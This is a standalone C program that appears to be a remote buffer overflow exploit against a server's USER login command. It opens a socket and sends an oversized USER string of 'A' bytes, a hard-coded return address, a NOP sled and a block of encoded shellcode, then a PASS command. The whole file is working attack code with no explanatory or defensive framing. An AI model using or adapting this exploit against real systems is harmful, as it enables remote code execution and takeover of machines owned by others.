#include <stdio.h>

#include <netinet/in.h>

#include <sys/socket.h>

#include <sys/types.h>

#include <netdb.h>

int main(int argc, char **argv)

{

struct sockaddr_in addr;

struct hostent *host;

char buffer[1109];

char buffer2[16];
int s, i;

if(argc != 3)

{

fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);

exit(0);

}

s = socket(AF_INET, SOCK_STREAM, 0);

if(s == -1)

{

perror("socket() failed\n");

exit(0);

}

host = gethostbyname(argv[1]);

if( host == NULL)

{

herror("gethostbyname() failed");

exit(0);

}

addr.sin_addr = *(struct in_addr*)host->h_addr;

addr.sin_family = AF_INET;

addr.sin_port = htons(atol(argv[2]));

 

if(connect(s, &addr, sizeof(addr)) == -1)

{

perror("couldn't connect so server\n");

exit(0);

}
char buffRead[2048];
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
/* Not difficult only filling buffer with Aâ€™s.... den sending nothing more */

char shellcode[] = "\xd9\xc9\xd9\x74\x24\xf4\xbe\x90\xa7\x83\xc6\x5d\x2b\xc9\xb1"
"\x49\x83\xc5\x04\x31\x75\x15\x03\x75\x15\x72\x52\x7f\x2e\xfb"
"\x9d\x80\xaf\x9b\x14\x65\x9e\x89\x43\xed\xb3\x1d\x07\xa3\x3f"
"\xd6\x45\x50\xcb\x9a\x41\x57\x7c\x10\xb4\x56\x7d\x95\x78\x34"
"\xbd\xb4\x04\x47\x92\x16\x34\x88\xe7\x57\x71\xf5\x08\x05\x2a"
"\x71\xba\xb9\x5f\xc7\x07\xb8\x8f\x43\x37\xc2\xaa\x94\xcc\x78"
"\xb4\xc4\x7d\xf7\xfe\xfc\xf6\x5f\xdf\xfd\xdb\xbc\x23\xb7\x50"
"\x76\xd7\x46\xb1\x47\x18\x79\xfd\x0b\x27\xb5\xf0\x52\x6f\x72"
"\xeb\x21\x9b\x80\x96\x31\x58\xfa\x4c\xb4\x7d\x5c\x06\x6e\xa6"
"\x5c\xcb\xe8\x2d\x52\xa0\x7f\x69\x77\x37\xac\x01\x83\xbc\x53"
"\xc6\x05\x86\x77\xc2\x4e\x5c\x16\x53\x2b\x33\x27\x83\x93\xec"
"\x8d\xcf\x36\xf8\xb7\x8d\x5e\xcd\x85\x2d\x9f\x59\x9e\x5e\xad"
"\xc6\x34\xc9\x9d\x8f\x92\x0e\xe1\xa5\x62\x80\x1c\x46\x92\x88"
"\xda\x12\xc2\xa2\xcb\x1a\x89\x32\xf3\xce\x1d\x63\x5b\xa1\xdd"
"\xd3\x1b\x11\xb5\x39\x94\x4e\xa5\x41\x7e\xe7\x4f\xbb\xe9\xc8"
"\x27\xd7\xfe\xa0\x35\xd8\x11\x6d\xb0\x3e\x7b\x9d\x94\xe9\x14"
"\x04\xbd\x62\x84\xc9\x68\x0f\x86\x42\x9e\xef\x49\xa3\xeb\xe3"
"\x3e\x43\xa6\x5e\xe8\x5c\x1d\xf4\x15\xc9\x99\x5f\x41\x65\xa3"
"\x86\xa5\x2a\x5c\xed\xbd\xe3\xc8\x4e\xaa\x0b\x1c\x4f\x2a\x5a"
"\x76\x4f\x42\x3a\x22\x1c\x77\x45\xff\x30\x24\xd0\xff\x60\x98"
"\x73\x97\x8e\xc7\xb4\x38\x70\x22\x45\x05\xa7\x0b\xc3\x7f\xcd"
"\x7f\x0f";

buffer[0] = 'U';
buffer[1] = 'S';
buffer[2] = 'E';
buffer[3] = 'R';
buffer[4] = ' ';

for(i = 5; i < 490 ; i++)

buffer[i] = 'A';

buffer[490] = '\xD7';
buffer[491] = '\x30';
buffer[492] = '\x9D';
buffer[493] = '\x7C';
buffer[494] = 'C';
buffer[495] = 'C';
buffer[496] = 'C';
buffer[497] = 'C';
for (i = 498; i < 784; i++)

buffer[i] = '\x90';

for (i = 0; i < 317; i++)

buffer[i+784] = shellcode[i];

buffer[1101] = '\r';
buffer[1102] = '\n';
buffer[1103] = '\0';
printf("buffer is: %s\n", buffer);

send(s, buffer, strlen(buffer), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);

buffer2[0] = 'P';
buffer2[1] = 'A';
buffer2[2] = 'S';
buffer2[3] = 'S';
buffer2[4] = ' ';
buffer2[5] = 'P';
buffer2[6] = 'A';
buffer2[7] = 'S';
buffer2[8] = 'S';
buffer2[9] = 'W';
buffer2[10] = 'O';
buffer2[11] = 'R';
buffer2[12] = 'D';
buffer2[13] = '\r';
buffer2[14] = '\n';
buffer2[15] = '\0';
send(s, buffer2, strlen(buffer2), 0);
recv(s, buffRead, 2048, 0);
printf("%s\n", buffRead);
close(s);

return 0;

}
